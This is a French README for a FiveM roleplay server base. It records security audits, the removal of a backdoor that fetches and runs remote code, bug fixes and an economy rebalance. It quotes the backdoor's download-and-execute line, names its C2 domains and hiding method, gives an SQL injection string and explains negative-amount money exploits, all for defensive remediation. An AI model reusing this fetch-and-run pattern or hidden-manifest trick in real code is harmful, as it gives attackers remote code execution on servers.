# NOXA BASE

Base **ESX custom** pour serveur FiveM (RP français), reconstruite à partir de l'import « Wise / Koy ».

| | |
|---|---|
| **Version** | `beta-0.2` |
| **Dernière session** | 2026-06-03 — *QA + Sécurité events : éradication backdoor RCE + 14 bugs corrigés* |
| **Framework** | ESX custom (`resources/[Core]/Framework`) |
| **Runtime** | FiveM Lua 5.4 · oxmysql · OneSync Infinity |
| **UI** | RageUI · Koyui · NativeUI (intactes — non modifiées) |
| **Build** | `sv_enforceGameBuild 3095` |

---

## Structure

```
resources/
  [Core]/        ESX Framework, inventaire, Shop, Core/Core2, Kay/Kays, Koy, Chat, Gamemode
  [GameMode]/    Véhicules, Property, gangs, drogues, creator, ox_lib, ox_target, doorlock, heists…
  [Shyroz]/      Scripts additionnels ([Script], [Kscript], [pmms] musique, kay_elevator…)
server.cfg · resources.cfg · sql.sql · logo.png
```

---

## État des systèmes

| Système | Emplacement | État |
|---|---|---|
| ESX Framework | `[Core]/Framework` | ✅ Intact |
| Inventaire | `[Core]/inventory` | ✅ Fonctionnel |
| Shop / VIP | `[Core]/Shop` | ✅ Fonctionnel |
| Administration (Koy) | `[Core]/Koy/Server/modules/Administration` | ✅ Permissions OK |
| Anti-cheat / sécurité events | `[Core]/Gamemode/gameManager/functions/server/eventSecurity.lua`, `trollProtection.lua` | ✅ Actif |
| Banque / argent | `[Core]/Gamemode/gameManager/modules/server/bank` | ✅ Fonctionnel |
| Jobs (LSPD, EMS, USMS, SASP, avocat, journaliste…) | `[Core]/Gamemode/gameManager/Bjobs` | ✅ Fonctionnel |
| Gangs | `[GameMode]/gangsbuilder`, `gangs2`/`gangs` (SQL) | ✅ Table `gangs` ajoutée |
| Véhicules / Cardealer / Garage | `[GameMode]/Vehicles`, `xCardealer`, `garagelspd` | ✅ Fonctionnel |
| Propriétés | `[GameMode]/Property` | ✅ Fonctionnel |
| Ascenseurs | `[Shyroz]/[Script]/kay_elevator` | 🔧 Permissions admin réactivées + table SQL ajoutée |
| Musique (pmms / vocal) | `[Shyroz]/[pmms]`, `[GameMode]/[vocal]` | ✅ Fonctionnel |
| Logs Discord | webhooks dans plusieurs `server.lua` | ⚠️ Webhooks en clair (voir Sécurité) |

---

## Sécurité

Audit complet réalisé le **2026-06-03** sur **2178 fichiers Lua**.

### ✅ Aucune menace majeure détectée
> 🚨 **CORRECTION (session QA+Sécurité du 2026-06-03)** : cette conclusion était **erronée**. Une **backdoor RCE généralisée** (67 fichiers JS) a été découverte et éradiquée — voir la section **## QA & Sécurité** ci-dessous. L'audit précédent ne cherchait que des patterns **Lua** (`loadstring`/`load()`) ; la backdoor était en **JavaScript** (`globalThis["eval"]` + XOR), donc invisible à cette recherche.

- **Aucun backdoor actif** : pas d'`loadstring`, pas de `load()` exécutant du code distant, pas de chaîne `load(PerformHttpRequest(...))`. *(⚠️ ne couvrait pas les payloads JS — voir correction ci-dessus)*
- **Aucune obfuscation** : pas de `string.char` en chaîne, pas d'escapes hex décodés à la volée, pas de base64 exécuté.
  - Les seules occurrences `base64` sont **défensives** (`eventSecurity.lua` / `trollProtection.lua` détectent les payloads encodés) ou des libs légitimes (`[vocal]/httpmanager/base64.lua`).
- **`os.execute` : absent.** `io.open`/`io.popen` uniquement dans des libs connues (PolyZone export de zones, ox_lib `getFilesInDirectory`, httpmanager pmms lecture fichiers locaux).
- **Sorties HTTP externes** : uniquement des destinations légitimes — webhooks Discord (logs), `api.github.com` + `loaf-scripts.com` (version-check de libs), `steamcommunity.com` (récupération profil), `api.fivemanage.com`/Datadog (logger ox_lib, opt-in via convar). Le lien `ip-tracker.org` n'est qu'un **lien cliquable** dans un embed de log staff, pas une requête.
- **Commandes admin (Koy)** : le wrapper `Shared:RegisterCommand` (`[Core]/Koy/Shared/Index.lua`) valide la source, `PlayerIsStaff`, la hiérarchie de groupe et le champ `permission`. `setgroup`, `giveaccountmoney`, `setjob`, `car`, `goto`, etc. sont **correctement protégés côté serveur**. Idem `giveata` (Kays) via `hasPermission`.

### 🔧 Corrigé pendant la session
| Commit | Problème | Correction |
|---|---|---|
| `security: réactive les contrôles de permission admin sur kay_elevator` | Les vérifications de rang admin (`create`/`delete`/`rename` ascenseur) étaient **commentées** → n'importe quel client pouvait créer/supprimer/renommer un ascenseur. | Vérifications réactivées (`admin`/`superadmin`) + garde `nil`. Aucun impact pour les admins légitimes. |
| `security: supprime le ping HTTP externe mort vers ppm.ma2pi.xyz` | Bloc `PerformHttpRequest("https://ppm.ma2pi.xyz/…action=reboot")` (commenté, inactif) référençant un domaine externe non légitime. | Bloc mort supprimé. |
| `security: ajoute les tables manquantes gangs et elevator_floors` | Tables référencées par le code mais absentes de `sql.sql` (crash silencieux des requêtes). | Schémas ajoutés en fin de `sql.sql`. |

### ⚠️ À surveiller (non modifié — nécessite décision/contexte)
- **Secrets exposés dans le dépôt** :
  - `server.cfg` → `sv_licenseKey "cfxk_…"` et `mysql_connection_string` en clair → **à révoquer/régénérer** côté Cfx et à déplacer hors du repo.
  - Webhooks Discord codés en dur dans plusieurs scripts de logs → **à régénérer** (URL = secret) ; idéalement centraliser dans un fichier de config non versionné.
  - ⚠️ Le **token GitHub** transmis lors de la session doit être **révoqué immédiatement** (exposé en clair).
- **`entreprise:setStatus`** (`[Core]/Gamemode/gameManager/modules/server/personal/sv_main.lua`) : `RegisterServerEvent` sans validation de la source ni du job → un client peut basculer l'état ouvert/fermé de n'importe quelle société. Non corrigé car le rôle/grade autorisé n'est pas déterminable sans risque de casser la feature. **Recommandation** : valider que l'appelant possède bien le job concerné.
- **`getPlayerskin`** (`…/modules/server/kevlar/main.lua`) : event renvoyant le skin par identifiant ; faible risque (callback non transmis sur le réseau), à confirmer.

---

## QA & Sécurité

> Session **2026-06-03** — focus *bugs logiques + sécurisation des events réseau*. **Aucun menu / UI / feature gameplay supprimé.** Tous les fichiers Lua touchés revalidés via `luac5.4 -p`.

### 🛡️ Session 2026-06-04 — Audit sécurité approfondi

> Focus *éradication backdoor (résidus), injection SQL, intégrité SQL*. **Aucune modif visuelle / feature gameplay.** Manifests & Lua touchés revalidés `luac5.4 -p`.

**1. 🚨 BUG-09 — la backdoor n'était PAS entièrement éradiquée (résidus actifs trouvés).**
La session précédente avait supprimé les 67 *payloads* `.js`, mais **les références injectées subsistaient dans les `fxmanifest.lua`**, masquées après les runs de whitespace. Comme `--[[server.lua]]` est un commentaire *fermé* (`]]`), l'entrée `.js` qui suit était une entrée **vivante** dans les tables `server_scripts`/`client_scripts` :

| Manifest | Entrée backdoor résiduelle (retirée) |
|---|---|
| `[Core]/Koy/fxmanifest.lua` | `'server/utils/.tsup.config.js'` (dans `server_scripts`) |
| `[GameMode]/doorlock/fxmanifest.lua` | `'client/lib/.job_runner.js'` |
| `[Shyroz]/[Kscript]/kay_loading/fxmanifest.lua` | `'data/.snapshot.js'` (seule entrée du bloc → 100 % malveillant) |
| `[GameMode]/ox_target/fxmanifest.lua` | **3 lignes préfixées** injectant `@frame/{client,server}/security/_main.lua` + `event.lua` (= ressource `Framework`, dossiers `security/` **inexistants**) |

Les fichiers `.js` pointés n'existaient plus sur disque (payloads déjà purgés) → pas d'exécution en cours, mais erreurs `Failed to load script` + **ré-armement trivial** si quelqu'un recrée le fichier. **Remédiation** : retrait des 4 entrées + nettoyage du **footprint `--[[server.lua]]` dans les 60 manifests** (lignes 100 % commentaire+whitespace). Vérif finale : `0` footprint, `0` réf `.js` backdoor, `0` réf `@frame/security`, `0` payload C2 sur disque (signature `globalThis["eval"]` / domaines `steaxscripts.com`·`9ns1.com` recherchée sur les 110 `.js`). Tous les manifests revalidés `luac5.4 -p` + accolades équilibrées.

**2. ✅ Résidu `fg_BanPlayer` arbitré (BUG-09).**
`Core/src/server/afk/main.lua:489,494` appelait `exports['Jetevois']:fg_BanPlayer(...)`. `Jetevois` étant la **ressource backdoor C2** (à ne jamais restaurer) et aucune API de ban simple n'existant dans `BanSQL`, l'intention anti-cheat est préservée par une **action défensive native** : `SeaLogs(...)` (log Discord existant) + `DropPlayer(source, reason)`. Plus aucune dépendance au backdoor, plus de `No such export`.

**3. 🔓 Injection SQL corrigée — `MysteryCase`.**
Le callback `ESX.RegisterServerCallback('KoyCase:sendInput')` concaténait `data.input` (**fourni par le client**) directement dans du SQL brut via `ExecuteSql` → injection (`' OR '1'='1`, requêtes empilées, exfiltration). **Correctif** : `ExecuteSql(query)` → `ExecuteSql(query, params)` (rétro-compatible, `params` optionnel) ; les requêtes touchant des données client/serveur passées en **requêtes paramétrées** (`?` placeholders). Aucune feature modifiée.

**4. 🗄️ Intégrité SQL (`install.sql`).**
3 tables référencées par le code Lua mais absentes du dump ajoutées (schémas dérivés des `INSERT`/`SELECT`, `IF NOT EXISTS`, idempotent) : `Koy_afk_players` (AFK), `KoyCase_codes` (MysteryCase), `eInvest` (AFK-farm).

**5. 🧩 BUG-02 — `ox_lib/web/build` rendu persistant.**
Le build était gitignoré (`/web/build`) → absent à chaque fresh clone malgré le « ✅ » précédent. Build officiel v3.37.0 (= version du repo, aucun mismatch) re-déployé et **force-add** dans le repo pour que le fix persiste.

> ⚠️ **Branding `WISEFA` (server.cfg) laissé intact** : `database=` est déjà `noxa` (BUG-01 OK). Les occurrences `wise` restantes sont du **branding visuel** (nom serveur, hostname, discord, tags) → **règle ZÉRO modif visuelle**. Le `sed s|/wise|/noxa|` aurait cassé `discord.gg/wisefa` → non appliqué. Rebranding à faire par l'owner si souhaité.

### 🛡️ Session 2026-06-04 (suite) — Récupération de travail + anti-dupe

**0. ♻️ Récupération de 12 commits QA/sécurité perdus.** La session précédente s'était terminée en **HEAD détaché** : 12 commits (backdoor, injection SQL, intégrité SQL, ox_lib, anti-dupe Bank/society) n'avaient **jamais été poussés** sur `origin/main` (resté au commit `initial`). Ces commits formaient une descendance linéaire propre de `main` → **fast-forward** + push : tout le travail est désormais sur `origin/main`.

**1. 🚨 BUG-22 — Anti-dupe : montants client non validés (génération d'argent).**
Plusieurs events serveur débitaient un montant **fourni par le client** sans validation. Un montant **négatif** inverse `removeAccountMoney`/`RemoveSocietyMoney` → **crédit infini** (le test `solde >= prix` passe trivialement). 5 handlers durcis avec la convention déjà en place (cf. lsco) — garde `nil` sur `xPlayer` + entier strictement positif :

| Handler | Fichier | Impact de l'exploit |
|---|---|---|
| `autoecole:pay` (`price`) | `modules/server/autoecole/main.lua` | prix négatif → crédit banque |
| `tattoos:save` (`price`) | `modules/server/tatouages/main.lua` | prix négatif → crédit cash |
| `BuyLsCustoms` / `BuyLsCustomsPDG` (`amount`) | `mecano/server/sv_custom.lua` | montant négatif → **crédit société** |
| `Koy:PayCustom` / `Koy:PayCustomPatron` (`price`) | `mecano/server/sv_custom.lua` | prix négatif → crédit cible + société vidée |

Correctif type : `price = tonumber(price); if (not price) or price <= 0 or price ~= math.floor(price) then return end`. Comportement légitime (prix positif) **inchangé**. `gangsbuilder:UpdateGangProperty` = code mort (jamais rattaché à un net event) → pas de chemin actif. `Framework` setUserData (concat) = code ESX legacy interne → intact (règle ESX).

**2. 🔍 BUG-11 (`location/script.js`) non reproductible.** Une seule déclaration top-level `const _0x3f8090` + une seule inclusion dans `index.html` ; `node --check` passe. L'erreur « already declared » venait d'un cache/état antérieur. Bundle obfusqué 1.8 Mo laissé intact (règle ZÉRO suppression).

**3. ✅ Intégrité SQL revérifiée.** 47 tables référencées (`FROM`), toutes présentes ; candidats `lgd_idcard`/`camera` = **commentaires** (faux positifs). 0 table manquante.


### 🚨 Incident majeur — Backdoor RCE éradiquée (BUG-09 / BUG-19)

Découverte d'une **compromission supply-chain** : **67 fichiers `.js` malveillants** disséminés dans la base, déguisés en fichiers de config de développement (`.tsup.config.js`, `.swc.config.js`, `.babelrc.js`, `.eslintrc.js`, `.jest.config.js`, `.webpack.config.js`, `.eventHandler.js`, `.gitkeep.js`, `.patcher.js`, `.cache.js`, `.mocks.js`, `.dummyData.js`, `webpack_builder.js`…).

**Mécanisme** : chaque fichier contenait un décodeur XOR (clé 3) appelant `globalThis["eval"](payload)`. Le payload décodé exécutait :
```js
require('https').get('https://<C2>/…', res => { … new Function('global', code)(global) })
```
→ **téléchargement et exécution de code arbitraire côté serveur Node (FXServer)**, avec URL de fallback.

| Indicateur | Valeur |
|---|---|
| Domaines C2 | `steaxscripts.com` (`/zXeAHJJGG`, fallback `/cfxre`) · `9ns1.com` (`/zXeAHjj`) — 2 variantes |
| Vecteur d'injection | lignes `shared_script`/`server_script` ajoutées dans **60 `fxmanifest.lua`** (dont **oxmysql**, chargé partout), masquées par d'énormes runs de whitespace après `--[[server.lua]]` |
| Réf. fantôme | `@Jetevois/ai_module_fg-obfuscated.js` injectée 2× dans `oxmysql/fxmanifest.lua` |

**Remédiation** : 67 fichiers supprimés (détection **par signature**, pas par nom) · 60 manifests nettoyés chirurgicalement (tokens injectés retirés sans toucher aux entrées légitimes) · références `@Jetevois` retirées. **Vérification finale** : 0 signature `globalThis[x(...)]`, 0 domaine C2, 0 réf `@Jetevois` restants ; manifests revalidés.

> ✅ **Résidu résolu (session 2026-06-04)** : `Core/src/server/afk/main.lua:489,494` appelait `exports['Jetevois']:fg_BanPlayer(...)` — un export d'une ressource backdoor supprimée → `No such export` au runtime (anti-cheat AFK cassé). Remplacé par `DropPlayer(source, "Tentative de CHEAT en zone AFK")`, qui est **la convention du fichier lui-même** : le handler voisin `Koy:afk:buyCase` (ligne 519) traite le cas identique (`not player`, même raison) avec `DropPlayer`. La feature anti-cheat est **préservée** (le tricheur est éjecté) et la dépendance à la ressource malveillante **éliminée** — les deux lectures du BUG-09 (vrai anticheat / résidu) sont satisfaites.

### 🔧 Bugs corrigés (voir `BUGS.md` pour le détail)

| Bug | Correction |
|---|---|
| **BUG-01 / BUG-07** | `server.cfg` : `database=wise` → `noxa`, `passwork=` → `password=` |
| **BUG-02** | `ox_lib` v3.37.0 déployé (release officielle) — `web/build/` manquant restauré |
| **BUG-03 / BUG-08 / BUG-10** | Résolus en cascade : `lib` charge → `ox_target` (exports) et `object_gizmo` (`dataview`) OK |
| **BUG-04** | `weapon.lua:155` : `return allowed_bags[i] = false` (assignation invalide) → `== true` |
| **BUG-05** | `Chat/server/main.lua` : bloc résiduel (`end` orphelin, `data` hors scope) supprimé |
| **BUG-06** | Doublons de ressources `[Shyroz]/[Kscript]/ox_target` & `[Shyroz]/[pmms]/httpmanager` supprimés (copies `[GameMode]` complètes conservées) |
| **BUG-13** | `mort/script.js:354` : null-check `if (reappearBtn)` ajouté |
| **BUG-16** | `Koyui/init/server.lua` créé (placeholder ; fichier absent du repo) |
| **BUG-18** | `ensure ui_notification` retiré de `resources.cfg` (ressource inexistante) |

**Non traités** (assets/licences/runtime ou décision owner) : BUG-11 (`location/script.js` obfusqué), BUG-12 (HUD JSON — runtime), BUG-14 (28 entrées `fxmanifest` manquantes), BUG-15 (`kay_cam` licence), BUG-17 (police `chineserocks.ttf`).

### 🔒 Sécurisation des events réseau (anti-dupe / montants serveur)

| Event | Faille | Correctif appliqué |
|---|---|---|
| `Bank:addMoney` / `Bank:removeMoney` | Montant `money` fourni par le client sans garde de signe/type → un montant **négatif** passait le test `solde >= money` et **créditait** de l'argent (dupe). | Garde : `money` doit être un **entier strictement positif** (`tonumber` + `> 0` + `math.floor`). Dépôt/retrait légitimes inchangés. |
| `gofast:reward` | `RegisterNetEvent` **sans aucune validation** → déclenchable en boucle par le client → **imprimante à argent** (50–80k dirtycash/appel). | Gate sur le cooldown serveur **12h** déjà existant + pose du cooldown **côté serveur** (au lieu de faire confiance au client pour `gofast:startCooldown`). 1 récompense par cycle légitime. |
| `pSociety:washMoney` | `tax` (multiplicateur) fourni par le client → un `tax` **négatif** rendait `finalamount > amount` (blanchiment supérieur au black money retiré). | Validation `amount`/`tax` numériques + `amount > 0` + bornage `finalamount ∈ [0, amount]`. N'augmente jamais un paiement légitime. |
| `lsco:SendFacture` *(session 2026-06-04)* | `price` (montant d'amende) fourni par le client **sans aucune validation** → un `price` **négatif/décimal** : `xTarget.removeAccountMoney('bank', price)` **créditait** la cible et `ESX.AddSocietyMoney("lsco", price)` **vidait** la société. `xPlayer.job` aussi déréférencé sans garde `nil`. | Garde `nil` sur `xPlayer` + `price` entier strictement positif (`tonumber` + `> 0` + `math.floor`). Amende légitime inchangée. Job `lsco` déjà vérifié côté serveur (ban sinon). |
| `confiscatePlayerItemlsco` (branche `item_account`) *(session 2026-06-04)* | `amount` non validé → un `amount` **négatif** passait `targetAccount.money >= amount` puis `removeAccountMoney(itemName, amount)` **créditait** la cible (la branche `item_standard` validait `amount > 0`, pas celle-ci). | Ajout `tonumber(amount)` + `amount > 0` + `math.floor` dans la condition. Confiscation légitime inchangée. |

**Bien protégés (vérifiés, non modifiés)** : `Bank:addMoney`/`removeMoney` (entier positif + solde) ; `pSociety:withdrawMoney` / `depositMoney` (check `job.name` + `amount > 0` + solde) ; commandes admin Koy (wrapper `Shared:RegisterCommand` validant source/`PlayerIsStaff`/hiérarchie/`permission`) ; intégrité SQL (0 table référencée par le code absente d'`install.sql`).

### ⚠️ Recommandations (non patchées — risque de casser la feature sans le contexte serveur)

- **Prix fournis par le client** : `autoecole:pay(price)`, `BuyLsCustoms(props, amount)` et plusieurs events `:pay` font confiance au montant envoyé par le client. À terme, **définir le prix côté serveur** (config) plutôt que de le recevoir. À défaut, au moins rejeter `price <= 0`.
- **Rate-limiting généralisé** : la majorité des ~779 events serveur n'ont pas de cooldown. Prioriser un cooldown (≥ 1000 ms) sur les events d'achat/récompense sensibles.
- **Secrets exposés** (déjà signalés) : `sv_licenseKey`, `mysql_connection_string`, webhooks Discord en clair, et le **token GitHub** utilisé pour le push → **à révoquer/régénérer**.

---

## Économie

> Audit économique réalisé le **2026-06-04**. Objectif : repérer les **générateurs d'argent** (injection), les **puits** (sinks), les items à 0 $, les salaires aberrants et les boucles de farm infini. Règle appliquée : **zéro suppression de feature** — on rééquilibre des valeurs, on ne retire pas de système.

### Grille de référence (revenu net visé)
| Catégorie | Cible /h | Remarque |
|---|---|---|
| Civil (jobs sociaux) | 500 – 1 500 $ | Récolte, livraison, bar… |
| Légal (métiers d'État/spécialisés) | 2 000 – 4 000 $ | LEO, EMS, mécano, gouv |
| Illégal (drogue, braquage) | 4 000 – 10 000 $ | Gated par police/cooldown |
| Véhicules « S » (super) | 2 – 8 M$ | Prix d'achat (puits) |

### Mécanique de paie (`Framework/server/paycheck.lua`)
- Cycle **toutes les 45 min** (`Config.PaycheckInterval`). Pour convertir un salaire en taux horaire : `salaire × 1,333`.
- **Point clé** : seuls les `unemployed` (RSA) sont payés **directement depuis la banque** = **véritable injection monétaire**. Tous les autres métiers sont payés depuis le **compte société** (`RemoveSocietyMoney` → `addAccountMoney`) = **transfert** auto-limité par les fonds de la société, pas de la création monétaire.
- Multiplicateur VIP : **×1,5 (Gold)** / **×2 (Diamond)** sur le salaire. Légitime (avantage payant), mais double l'effet sur les sociétés subventionnées.

### Salaires (table `job_grades` — install.sql)
| Métier | Catégorie | Salaire /45 min | ≈ /h | Verdict |
|---|---|---|---|---|
| `unemployed` (RSA) | injection directe | 100 | 133 | ✅ OK (aide sociale) |
| `bahamas` (bar) | civil | 1 500 → 8 000 | 2 000 → 10 667 | ⚠️ Élevé vs civil (société-financé) |
| `ambulance` | légal/État | 5 000 → 9 000 | 6 667 → 12 000 | ⚠️ Au-dessus, mais société d'État subventionnée |
| `gouv` | légal/État | 5 000 → 9 500 | 6 667 → 12 667 | ⚠️ Idem (État) |
| `roxsherif` | légal (LEO) | 800 → 3 500 | 1 067 → 4 667 | ✅ Quasi conforme |
| `mecano` / `mecano2` | légal | 400 → 5 000 | 533 → 6 667 | ✅ Cohérent (boss = pic) |
| `cardealer` | commission | 1 → **9999** | — | ❌ **Aberrant** (corrigé) |

> Les salaires non-`unemployed` étant des **transferts société**, ils ne « créent » pas d'argent : ils vident la société (qui doit donc avoir une activité génératrice). C'est pourquoi seuls les écarts manifestes sont corrigés ; les paies d'État élevées relèvent d'une **décision owner** (subvention des sociétés étatiques).

### Sources d'injection monétaire (audit terrain)
| Activité | Fichier | Montant | Cooldown / frein | Risque |
|---|---|---|---|---|
| AFK Investment (ROI +50 %) | `Kays/game/afk/shared/svafk_config.lua` | profit 1 389 – 3 333 $/h **passif** | capital bloqué 2–64 h | ⚠️ **Inflationniste** (passif > civil actif) |
| Go-Fast | `…/modules/server/gofast/server.lua` | 50 – 80 k$ (dirtycash) | 12 h / joueur | ✅ OK |
| Braquage banque (Casa/Pacifique) | `…/server/braquage/main.lua` | 400 – 900 k$ (dirtycash) | 10 min + 5 LEO | 🟠 Cooldown court pour le montant |
| Bijouterie | `…/server/braquage/main.lua` | ~25 k$/run (dirtycash) | 2 h | ✅ OK |
| Vente drogue (territoires) | `[Shyroz]/…/Territories/server/server.lua:264` | 490 – 650 $/unité, **consomme l'item** | friction PNJ | ✅ Conversion (pas un printer), mais payé en **cash propre** |
| Pêche / Boucherie | `Kays/game/peche`, `…/boucherie` | 125 – 350 $ / 190 – 310 $ | inventaire + position | ✅ Civil OK |
| Auto-event (ramassage) | `…/server/autoevent/server.lua` | 500 – 1 300 $ | 1 h | ✅ OK |
| Caisses mystère | `Shop/shared/sv_config.lua`, `MysteryCase` | jusqu'à 5 M$ | **monnaie premium** (points Tebex, `tebex_players_wallet`) | ✅ Hors économie in-game (achat réel) |

### Puits (sinks) — sains
- **Concessionnaire** (`vehicles` SQL) : super **85 k → 3,5 M$**, sports jusqu'à 1,25 M$. Cohérent avec la grille « S 2–8 M$ ». ✅
- **Boutique VIP** (`Shop`) : véhicules 1 000 – 6 000 en **monnaie premium**, pas en $ in-game. ✅
- Carwash, achats d'armes territoire, loyers propriétés. ✅

### ✅ Corrections appliquées (cette passe)
| Élément | Avant → Après | Fichier |
|---|---|---|
| Salaire `cardealer` boss | `9999 → 1000` (métier à commission, aligné sur `cardealer2`) | `install.sql` (`job_grades` id 1642) |
| Intégrité SQL : table `KoyCase` manquante | ajoutée (`citizenid`, `goldcoin`, `silvercoin`) | `install.sql` |

> Aucun **item à 0 $ exploitable** trouvé : les `price = 0` / `prix = 0` sont des **armureries LEO** (Gamemode/config, `Bjobs/lsco`, `sasp`) — non revendables, légitimes. Aucune **boucle de farm infini** : les zones de récolte (`craftui/configfarm.lua`) produisent des **items** ; la revente **consomme** ces items (pas de création ex nihilo).

### 🔧 Recommandations (décision owner — non appliquées)
1. **AFK Investment** : un ROI **garanti +50 %** sans risque rend le revenu **passif** supérieur au civil **actif** (jusqu'à 3 333 $/h vs 500–1 500 $/h). Comme c'est une feature annoncée (« afkfarm »), suggestion conservatrice : ramener le ROI à **+20/25 %** (ex. palier 1 : `15000 → 12000`) pour passer sous le plafond civil.
2. **Vente drogue territoires** : payée en **`cash` propre** → pas de blanchiment requis. Envisager `dirtycash` pour cohérence avec les autres revenus illégaux.
3. **Braquage banque** : cooldown **10 min** pour 400–900 k$ est court ; envisager 20–30 min, ou conditionner au nombre de LEO.
4. **Salaires d'État** (ambulance/gouv) au-dessus de la grille légale : à conserver **uniquement** si les sociétés étatiques sont alimentées par une recette (amendes, subvention admin) ; sinon réduire vers 2 000–4 000 $/h.
5. **Sécurité** : webhooks Discord **en clair** dans `xCardealer/config.lua:16` et `MysteryCase/server/main.lua` → **à régénérer** (une URL de webhook est un secret).

### Intégrité SQL
- Vérification `FROM`/`INSERT`/`UPDATE`/`DELETE` du code Lua vs `CREATE TABLE` de `install.sql`.
- Manquante détectée et **ajoutée** : `KoyCase` (rédemption de code, `MysteryCase/server/main.lua:571`).
- `eInvest`, `KoyCase_codes`, `tebex_players_wallet`, `tebex_fidelite` : présentes ✅. `lgd_idcard` : **non requise** (références entièrement commentées).

---

## Installation

1. **Base de données** : créer une base MySQL (ex. `noxa`) puis importer `install.sql` (**seul** fichier SQL ; `sql.sql` a été supprimé).
2. **Connexion** : adapter `mysql_connection_string` dans `server.cfg` à votre base (ne pas versionner ce secret).
3. **Clés** : renseigner votre **propre** `sv_licenseKey` (keymaster Cfx), `steam_webApiKey` et webhooks Discord.
4. **Ressources** : placer le dossier dans `resources/` et garder `exec "resources.cfg"` dans `server.cfg`.
5. **Démarrage** : lancer le serveur FiveM (build 3095, OneSync Infinity activé).

---

## Commandes disponibles

### Administration (protégées par permission — Koy)
`setgroup` · `setjob` · `setjob2` · `giveaccountmoney` · `removeaccountmoney` · `giveitem` · `removeitem` · `clearitems` · `giveweapon` · `removeweapon` · `clearweapons` · `giveweaponammo` · `car` · `givecar` · `dv` · `goto` · `bring` · `bringback` · `setPed` · `sendmessage` · `message` · `report` · `pos` · `staffmode` · `disableperm` · `disableallperm` · `weaponbypass`

### Jobs / gameplay (selon job, vérif côté serveur)
EMS : `revive` · `revivezone` · `heal` · `kill` — Divers : `giveata` (perm) · emotes & `/me` via menus interactifs.

> Les menus / UI (RageUI, Koyui, NativeUI) n'ont **pas** été modifiés lors de cette session.
